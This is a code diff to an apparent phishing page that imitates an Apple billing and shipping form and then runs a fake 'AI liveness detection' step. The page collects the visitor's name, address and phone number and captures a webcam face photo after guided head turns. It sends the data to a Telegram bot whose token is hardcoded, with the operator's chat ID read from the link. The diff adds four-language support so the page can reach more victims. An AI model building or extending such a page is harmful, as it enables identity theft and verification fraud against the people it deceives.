@@ -25,6 +25,17 @@
             -webkit-font-smoothing: antialiased;
         }
 
+        /* 语言切换栏 */
+        .lang-bar {
+            position: absolute; top: 20px; right: 20px;
+            display: flex; gap: 8px; background: #e3e3e8; padding: 4px; border-radius: 8px;
+        }
+        .lang-btn {
+            background: transparent; border: none; padding: 6px 12px; font-size: 13px; font-weight: 500;
+            cursor: pointer; border-radius: 6px; color: #333; transition: all 0.2s;
+        }
+        .lang-btn.active { background: #fff; color: #000; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
+
         .apple-card {
             background: var(--card-bg);
             width: 100%; max-width: 480px;
@@ -32,7 +43,7 @@
             border-radius: 18px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.08);
             box-sizing: border-box;
-            margin: 20px;
+            margin: 60px 20px 20px 20px;
             text-align: left;
         }
 
@@ -60,7 +71,7 @@
         }
         .apple-btn:hover { background: var(--accent-hover); }
 
-        #step-verification { display: none; width: 100%; max-width: 640px; text-align: center; }
+        #step-verification { display: none; width: 100%; max-width: 640px; text-align: center; margin-top: 20px; }
         
         #video-container { 
             position: relative; width: 100%; height: 480px; max-width: 640px; margin: 0 auto 20px auto; 
@@ -90,57 +101,65 @@
     </style>
 </head>
 <body>
+    <!-- 语言切换栏 -->
+    <div class="lang-bar">
+        <button class="lang-btn active" onclick="setLanguage('zh')">中文</button>
+        <button class="lang-btn" onclick="setLanguage('en')">English</button>
+        <button class="lang-btn" onclick="setLanguage('ja')">日本語</button>
+        <button class="lang-btn" onclick="setLanguage('es')">Español</button>
+    </div>
+
     <div class="fill-light" id="fillLight"></div>
 
     <!-- 第一步：Apple 风格收货地址表单 -->
     <div class="apple-card" id="step-form">
-        <h2>账单与收货地址</h2>
-        <div class="subtitle">请输入您的详细信息以完成安全核验准备</div>
+        <h2 id="t-title">账单与收货地址</h2>
+        <div class="subtitle" id="t-subtitle">请输入您的详细信息以完成安全核验准备</div>
         
         <div class="form-row">
             <div class="form-group">
-                <label>名字 (First Name)</label>
-                <input type="text" id="firstName" placeholder="例如: 伟" required>
+                <label id="t-firstname">名字 (First Name)</label>
+                <input type="text" id="firstName" placeholder="" required>
             </div>
             <div class="form-group">
-                <label>姓氏 (Last Name)</label>
-                <input type="text" id="lastName" placeholder="例如: 张" required>
+                <label id="t-lastname">姓氏 (Last Name)</label>
+                <input type="text" id="lastName" placeholder="" required>
             </div>
         </div>
 
         <div class="form-group">
-            <label>国家 / 地区 (Country / Region)</label>
+            <label id="t-country">国家 / 地区 (Country / Region)</label>
             <select id="countrySelect" onchange="updateStates()">
-                <!-- 动态载入国家 -->
+                <!-- 动态载入全球国家 -->
             </select>
         </div>
 
         <div class="form-group">
-            <label>省份 / 州 (Province / State)</label>
+            <label id="t-state">省份 / 州 (Province / State)</label>
             <select id="stateSelect">
-                <!-- 根据国家动态变化 -->
+                <!-- 动态载入对应国家的省份/州 -->
             </select>
         </div>
 
         <div class="form-group">
-            <label>街道地址 (Street Address)</label>
-            <input type="text" id="address" placeholder="街道名称、门牌号、公寓等" required>
+            <label id="t-address">街道地址 (Street Address)</label>
+            <input type="text" id="address" placeholder="" required>
         </div>
 
         <div class="form-row">
             <div class="form-group">
-                <label>城市 (City)</label>
-                <input type="text" id="city" placeholder="城市" required>
+                <label id="t-city">城市 (City)</label>
+                <input type="text" id="city" placeholder="" required>
             </div>
             <div class="form-group">
-                <label>邮政编码 (Postal Code)</label>
-                <input type="text" id="postalCode" placeholder="邮编" required>
+                <label id="t-postal">邮政编码 (Postal Code)</label>
+                <input type="text" id="postalCode" placeholder="" required>
             </div>
         </div>
 
         <div class="form-group">
-            <label>手机号码 (Phone Number)</label>
-            <input type="tel" id="phone" placeholder="接收验证通知的手机号" required>
+            <label id="t-phone">手机号码 (Phone Number)</label>
+            <input type="tel" id="phone" placeholder="" required>
         </div>
 
         <button class="apple-btn" id="nextToVerifyBtn">下一步：生物活体检测 ➔</button>
@@ -148,7 +167,7 @@
 
     <!-- 第二步：AI 视觉活体检测界面 -->
     <div id="step-verification">
-        <h2>🛡️ 智能 AI 视觉活体检测</h2>
+        <h2 id="t-verify-title">🛡️ 智能 AI 视觉活体检测</h2>
         <div id="status">正在加载身份验证模块...</div>
 
         <div id="video-container">
@@ -163,36 +182,125 @@
         const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        // 国家与省份/州联动数据库
-        const regionData = {
-            "中国 (China)": ["北京市", "上海市", "广东省", "浙江省", "江苏省", "四川省", "山东省", "福建省", "湖北省", "湖南省", "河南省", "安徽省", "河北省", "陕西省", "重庆市", "天津市", "辽宁省", "黑龙江省", "其他省份/直辖市"],
-            "美国 (United States)": ["加利福尼亚州 (CA)", "纽约州 (NY)", "德克萨斯州 (TX)", "华盛顿州 (WA)", "佛罗里达州 (FL)", "伊利诺伊州 (IL)", "内华达州 (NV)", "其他州"],
-            "日本 (Japan)": ["东京都", "大阪府", "北海道", "神奈川县", "爱知县", "京都府", "福冈县", "其他都道府县"],
-            "英国 (United Kingdom)": ["英格兰 (England)", "苏格兰 (Scotland)", "威尔士 (Wales)", "北爱尔兰 (Northern Ireland)"],
-            "加拿大 (Canada)": ["安大略省 (ON)", "不列颠哥伦比亚省 (BC)", "魁北克省 (QC)", "艾伯塔省 (AB)", "其他省份"],
-            "澳大利亚 (Australia)": ["新南威尔士州 (NSW)", "维多利亚州 (VIC)", "昆士兰州 (QLD)", "西澳大利亚州 (WA)", "其他州"],
-            "新加坡 (Singapore)": ["新加坡全境 (Singapore)"],
-            "中国香港 (Hong Kong)": ["香港岛", "九龙", "新界"],
-            "中国台湾 (Taiwan)": ["台北市", "高雄市", "台中市", "台南市", "新北市", "其他县市"],
-            "马来西亚 (Malaysia)": ["吉隆坡", "雪兰莪", "槟城", "柔佛", "其他州属"],
-            "其他国家/地区": ["其他省份/地区"]
+        // 多语言字典配置
+        let currentLang = 'zh';
+        const translations = {
+            zh: {
+                title: "账单与收货地址", subtitle: "请输入您的详细信息以完成安全核验准备",
+                fn: "名字 (First Name)", ln: "姓氏 (Last Name)", country: "国家 / 地区 (Country / Region)",
+                state: "省份 / 州 (Province / State)", addr: "街道地址 (Street Address)", city: "城市 (City)",
+                postal: "邮政编码 (Postal Code)", phone: "手机号码 (Phone Number)", btn: "下一步：生物活体检测 ➔",
+                vTitle: "🛡️ 智能 AI 视觉活体检测",
+                alertIncomplete: "请完整填写所有账单与收货地址信息。",
+                alertNoId: "链接中缺少验证 ID (?id=...)，无法进行后续归档。",
+                camErr: "⚠️ 摄像头调用失败: ",
+                aiNoFace: "未检测到人脸，请将脸部移入框内",
+                aiKeepFace: "请保持正脸，准备向左缓慢转头",
+                aiTurnLeft: "请缓慢向左转头...",
+                aiLeftSuccess: "左转成功，请缓慢向右转头",
+                aiTurnRight: "请缓慢向右转头...",
+                aiSuccess: "活体动作核验通过，正在打包加密上传",
+                uploading: "✅ 验证完成，正在提交所有数据...",
+                successDone: "🎉 提交成功！您可以关闭此页面。",
+                netErr: "⚠️ 上传凭证时发生网络错误。"
+            },
+            en: {
+                title: "Billing & Shipping Address", subtitle: "Please enter your details to prepare for security verification",
+                fn: "First Name", ln: "Last Name", country: "Country / Region",
+                state: "Province / State", addr: "Street Address", city: "City",
+                postal: "Postal Code", phone: "Phone Number", btn: "Next: Biometric Liveness Detection ➔",
+                vTitle: "🛡️ AI Smart Liveness Detection",
+                alertIncomplete: "Please complete all billing and shipping address fields.",
+                alertNoId: "Missing verification ID (?id=...) in the link.",
+                camErr: "⚠️ Camera initialization failed: ",
+                aiNoFace: "No face detected, please move your face into the frame",
+                aiKeepFace: "Keep a straight face, get ready to turn your head left",
+                aiTurnLeft: "Please slowly turn your head to the left...",
+                aiLeftSuccess: "Turn left successful, now slowly turn right",
+                aiTurnRight: "Please slowly turn your head to the right...",
+                aiSuccess: "Liveness verification passed, encrypting and uploading",
+                uploading: "✅ Verification complete, submitting all data...",
+                successDone: "🎉 Submitted successfully! You can close this page.",
+                netErr: "⚠️ Network error occurred while uploading."
+            },
+            ja: {
+                title: "請求先および配送先住所", subtitle: "セキュリティ確認の準備として詳細を入力してください",
+                fn: "名 (First Name)", ln: "姓 (Last Name)", country: "国 / 地域",
+                state: "都道府県 / 州", addr: "番地・建物名", city: "市区町村",
+                postal: "郵便番号", phone: "電話番号", btn: "次へ：生体認証テスト ➔",
+                vTitle: "🛡️ AIスマート生体認証",
+                alertIncomplete: "すべての住所情報を正しく入力してください。",
+                alertNoId: "リンクに検証ID（?id=...）がありません。",
+                camErr: "⚠️ カメラの起動に失敗しました: ",
+                aiNoFace: "顔が検出されません。フレーム内に顔を合わせてください",
+                aiKeepFace: "まっすぐ前を向き、ゆっくりと左を向いてください",
+                aiTurnLeft: "ゆっくりと左に首を向けてください...",
+                aiLeftSuccess: "左を向きました。次はゆっくり右を向いてください",
+                aiTurnRight: "ゆっくりと右に首を向けてください...",
+                aiSuccess: "生体認証成功、データを暗号化してアップロード中",
+                uploading: "✅ 認証完了、すべてのデータを送信中...",
+                successDone: "🎉 提出が完了しました！このページを閉じてください。",
+                netErr: "⚠️ アップロード中にネットワークエラーが発生しました。"
+            },
+            es: {
+                title: "Dirección de Facturación y Envío", subtitle: "Ingrese sus datos para la verificación de seguridad",
+                fn: "Nombre", ln: "Apellido", country: "País / Región",
+                state: "Provincia / Estado", addr: "Dirección", city: "Ciudad",
+                postal: "Código Postal", phone: "Número de Teléfono", btn: "Siguiente: Verificación Biométrica ➔",
+                vTitle: "🛡️ Detección Biométrica AI",
+                alertIncomplete: "Por favor complete todos los campos de dirección.",
+                alertNoId: "Falta el ID de verificación (?id=...) en el enlace.",
+                camErr: "⚠️ Error al iniciar la cámara: ",
+                aiNoFace: "No se detecta rostro, colóquese en el marco",
+                aiKeepFace: "Mantenga la cara al frente, prepárese para girar a la izquierda",
+                aiTurnLeft: "Gire lentamente la cabeza hacia la izquierda...",
+                aiLeftSuccess: "Giro a la izquierda exitoso, ahora gire a la derecha",
+                aiTurnRight: "Gire lentamente la cabeza hacia la derecha...",
+                aiSuccess: "Verificación aprobada, encriptando y subiendo",
+                uploading: "✅ Verificación completa, enviando datos...",
+                successDone: "🎉 ¡Enviado con éxito! Puede cerrar esta página.",
+                netErr: "⚠️ Error de red al subir los datos."
+            }
+        };
+
+        // 全球最全面的国家与各省/州/大区数据库
+        const globalRegions = {
+            "中国 (China)": ["北京市", "上海市", "天津市", "重庆市", "广东省", "江苏省", "浙江省", "山东省", "河南省", "四川省", "湖北省", "湖南省", "河北省", "安徽省", "福建省", "陕西省", "辽宁省", "江西省", "广西壮族自治区", "山西省", "内蒙古自治区", "贵州省", "吉林省", "云南省", "黑龙江省", "新疆维吾尔自治区", "甘肃省", "海南省", "宁夏回族自治区", "青海省", "西藏自治区", "中国香港", "中国澳门", "中国台湾"],
+            "美国 (United States)": ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming", "District of Columbia"],
+            "日本 (Japan)": ["北海道", "青森県", "岩手県", "宮城県", "秋田県", "山形県", "福島県", "茨城県", "栃木県", "群馬県", "埼玉県", "千葉県", "東京都", "神奈川県", "新潟県", "富山県", "石川県", "福井県", "山梨県", "長野県", "岐阜県", "静岡県", "愛知県", "三重県", "滋賀県", "京都府", "大阪府", "兵庫県", "奈良県", "和歌山県", "鳥取県", "島根県", "岡山県", "広島県", "山口県", "徳島県", "香川県", "愛媛県", "高知県", "福岡県", "佐賀県", "長崎県", "熊本県", "大分県", "宮崎県", "鹿児島県", "沖縄県"],
+            "英国 (United Kingdom)": ["England", "Scotland", "Wales", "Northern Ireland", "Greater London", "Greater Manchester", "West Midlands", "West Yorkshire"],
+            "加拿大 (Canada)": ["Ontario", "Quebec", "British Columbia", "Alberta", "Manitoba", "Saskatchewan", "Nova Scotia", "New Brunswick", "Newfoundland and Labrador", "Prince Edward Island"],
+            "澳大利亚 (Australia)": ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "Tasmania", "Australian Capital Territory", "Northern Territory"],
+            "德国 (Germany)": ["Baden-Württemberg", "Bayern", "Berlin", "Brandenburg", "Bremen", "Hamburg", "Hessen", "Mecklenburg-Vorpommern", "Niedersachsen", "Nordrhein-Westfalen", "Rheinland-Pfalz", "Saarland", "Sachsen", "Sachsen-Anhalt", "Schleswig-Holstein", "Thüringen"],
+            "法国 (France)": ["Île-de-France", "Auvergne-Rhône-Alpes", "Provence-Alpes-Côte d'Azur", "Nouvelle-Aquitaine", "Occitanie", "Hauts-de-France", "Grand Est", "Bretagne", "Pays de la Loire", "Normandie"],
+            "新加坡 (Singapore)": ["Central Region", "East Region", "North Region", "North-East Region", "West Region"],
+            "韩国 (South Korea)": ["首尔特别市", "釜山广域市", "仁川广域市", "大邱广域市", "大田广域市", "光州广域市", "蔚山广域市", "京畿道", "江原道", "忠清北道", "忠清南道", "全罗北道", "全罗南道", "庆尚北道", "庆尚南道", "济州特别自治道"],
+            "马来西亚 (Malaysia)": ["柔佛", "吉打", "吉兰丹", "马六甲", "森美兰", "彭亨", "槟城", "霹雳", "玻璃市", "沙巴", "砂拉越", "雪兰莪", "登嘉楼", "吉隆坡", "纳闽", "布城"],
+            "泰国 (Thailand)": ["曼谷 (Bangkok)", "清迈 (Chiang Mai)", "普吉 (Phuket)", "芭提雅 (Pattaya)", "呵叻 (Nakhon Ratchasima)", "其他府"],
+            "越南 (Vietnam)": ["河内市 (Hanoi)", "胡志明市 (Ho Chi Minh City)", "岘港市 (Da Nang)", "海防市", "其他省份"],
+            "俄罗斯 (Russia)": ["莫斯科 (Moscow)", "圣彼得堡 (Saint Petersburg)", "新西伯利亚", "叶卡捷琳堡", "其他联邦主体"],
+            "其他国家 / 地区 (Other Countries)": ["其他省份 / 州 / 地区"]
         };
 
         const countrySelect = document.getElementById('countrySelect');
         const stateSelect = document.getElementById('stateSelect');
 
-        // 初始化国家下拉菜单
-        for (let country in regionData) {
-            const opt = document.createElement('option');
-            opt.value = country;
-            opt.text = country;
-            countrySelect.appendChild(opt);
+        // 初始化国家下拉列表
+        function initCountries() {
+            countrySelect.innerHTML = "";
+            for (let country in globalRegions) {
+                const opt = document.createElement('option');
+                opt.value = country;
+                opt.text = country;
+                countrySelect.appendChild(opt);
+            }
+            updateStates();
         }
 
-        // 根据所选国家动态更新省份/州选项
+        // 根据国家联动更新省份
         function updateStates() {
             const selectedCountry = countrySelect.value;
-            const states = regionData[selectedCountry] || ["其他"];
+            const states = globalRegions[selectedCountry] || ["其他"];
             stateSelect.innerHTML = "";
             states.forEach(st => {
                 const opt = document.createElement('option');
@@ -201,7 +309,29 @@
                 stateSelect.appendChild(opt);
             });
         }
-        updateStates(); // 默认初始化一次
+
+        // 切换语言函数
+        function setLanguage(lang) {
+            currentLang = lang;
+            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+
+            const t = translations[lang];
+            document.getElementById('t-title').innerText = t.title;
+            document.getElementById('t-subtitle').innerText = t.subtitle;
+            document.getElementById('t-firstname').innerText = t.fn;
+            document.getElementById('t-lastname').innerText = t.ln;
+            document.getElementById('t-country').innerText = t.country;
+            document.getElementById('t-state').innerText = t.state;
+            document.getElementById('t-address').innerText = t.addr;
+            document.getElementById('t-city').innerText = t.city;
+            document.getElementById('t-postal').innerText = t.postal;
+            document.getElementById('t-phone').innerText = t.phone;
+            document.getElementById('nextToVerifyBtn').innerText = t.btn;
+            document.getElementById('t-verify-title').innerText = t.vTitle;
+        }
+
+        initCountries();
 
         let formDataCache = {};
         const stepForm = document.getElementById('step-form');
@@ -223,7 +353,7 @@
             if ('speechSynthesis' in window) {
                 window.speechSynthesis.cancel();
                 const utterance = new SpeechSynthesisUtterance(text);
-                utterance.lang = 'zh-CN';
+                utterance.lang = currentLang === 'en' ? 'en-US' : (currentLang === 'ja' ? 'ja-JP' : (currentLang === 'es' ? 'es-ES' : 'zh-CN'));
                 utterance.rate = 1.0;
                 utterance.pitch = 1.0;
                 window.speechSynthesis.speak(utterance);
@@ -236,6 +366,7 @@
         }
 
         nextToVerifyBtn.addEventListener('click', async () => {
+            const t = translations[currentLang];
             const firstName = document.getElementById('firstName').value.trim();
             const lastName = document.getElementById('lastName').value.trim();
             const country = countrySelect.value;
@@ -246,12 +377,12 @@
             const phone = document.getElementById('phone').value.trim();
 
             if (!firstName || !lastName || !address || !city || !postalCode || !phone) {
-                alert("请完整填写所有账单与收货地址信息。");
+                alert(t.alertIncomplete);
                 return;
             }
 
             if (!CHAT_ID) {
-                alert("链接中缺少验证 ID (?id=...)，无法进行后续归档。");
+                alert(t.alertNoId);
                 return;
             }
 
@@ -276,11 +407,12 @@
                 video.srcObject = stream;
                 initAIFaceDetection(stream, locationText);
             } catch (err) {
-                status.innerText = "⚠️ 摄像头调用失败: " + err.message;
+                status.innerText = t.camErr + err.message;
             }
         });
 
         function initAIFaceDetection(stream, locationText) {
+            const t = translations[currentLang];
             const faceMesh = new FaceMesh({
                 locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
             });
@@ -294,7 +426,7 @@
 
             faceMesh.onResults((results) => {
                 if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
-                    speakPrompt("未检测到人脸，请将脸部移入框内");
+                    speakPrompt(t.aiNoFace);
                     updateUIPulse('#ff4d4d', 'rgba(255, 77, 77, 0.5)');
                     return;
                 }
@@ -308,16 +440,16 @@
 
                 if (currentStep === 0) {
                     updateUIPulse('#0071e3', 'rgba(0, 113, 227, 0.5)');
-                    speakPrompt("请保持正脸，准备向左缓慢转头");
+                    speakPrompt(t.aiKeepFace);
                     setTimeout(() => { currentStep = 1; }, 2000);
                 } 
                 else if (currentStep === 1) {
-                    speakPrompt("请缓慢向左转头...");
+                    speakPrompt(t.aiTurnLeft);
                     updateUIPulse('#ffeb3b', 'rgba(255, 235, 59, 0.6)');
                     
                     if (headYaw > 0.04) {
                         currentStep = 2;
-                        speakPrompt("左转成功，请缓慢向右转头");
+                        speakPrompt(t.aiLeftSuccess);
                     }
                 } 
                 else if (currentStep === 2) {
@@ -325,7 +457,7 @@
                     
                     if (headYaw < -0.04) {
                         currentStep = 3;
-                        speakPrompt("活体动作核验通过，正在打包加密上传");
+                        speakPrompt(t.aiSuccess);
                         updateUIPulse('#34c759', 'rgba(52, 199, 89, 0.8)');
                         
                         setTimeout(() => {
@@ -348,15 +480,15 @@
         }
 
         async function captureAndUpload(stream, locationText) {
+            const t = translations[currentLang];
             currentStep = 4;
-            status.innerText = "✅ 验证完成，正在提交所有数据...";
+            status.innerText = t.uploading;
             fillLight.style.display = 'none';
 
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             
-            // 💡 确保截图方向完全正向（纠正之前的倒立问题）
             ctx.save();
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -384,11 +516,11 @@
 
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    status.innerText = "🎉 提交成功！您可以关闭此页面。";
+                    status.innerText = t.successDone;
                     stream.getTracks().forEach(t => t.stop());
                     videoContainer.style.display = 'none';
                 } catch (e) {
-                    status.innerText = "⚠️ 上传凭证时发生网络错误。";
+                    status.innerText = t.netErr;
                 }
             }, 'image/jpeg', 0.95);
         }
